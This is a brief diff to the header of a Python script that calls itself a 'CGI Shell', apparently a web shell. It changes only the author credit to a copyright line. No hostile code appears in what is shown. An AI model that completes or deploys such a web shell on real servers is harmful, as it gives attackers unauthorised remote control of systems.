@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # Python CGI Shell
-# Coded By Afrizal F.A
+# Copyright (c)2019 - Afrizal F.A - ICWR-TECH
 try:
     import cgitb; cgitb.enable()
 except:
